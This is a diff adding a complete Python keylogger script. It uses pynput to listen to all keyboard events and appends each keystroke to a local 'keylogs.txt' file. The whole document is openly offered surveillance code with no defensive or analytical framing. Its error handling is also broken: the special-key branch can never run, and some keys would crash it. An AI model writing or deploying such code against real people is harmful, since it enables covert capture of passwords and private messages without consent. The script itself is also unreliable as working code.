@@ -1,0 +1,26 @@
+import os
+from pynput import keyboard
+
+# Get the current working directory
+cwd = os.getcwd()
+
+# Define the path for the keylogs file
+file_path = os.path.join(cwd, 'keylogs.txt')
+
+def on_press(key):
+    try:
+        # Write letters/numbers using key.char
+        with open(file_path, 'a') as f:
+            if hasattr(key, 'char'):
+                print(f"Writing letter/number: {key.char}")
+                f.write(key.char)
+    except AttributeError:
+        # Write special keys using str(key)
+        with open(file_path, 'a') as f:
+            print(f"Writing special key: {str(key)}")
+            f.write(str(key))
+
+# Create a listener for keyboard events
+with keyboard.Listener(on_press=on_press) as listener:
+    # Run the listener indefinitely
+    listener.join()
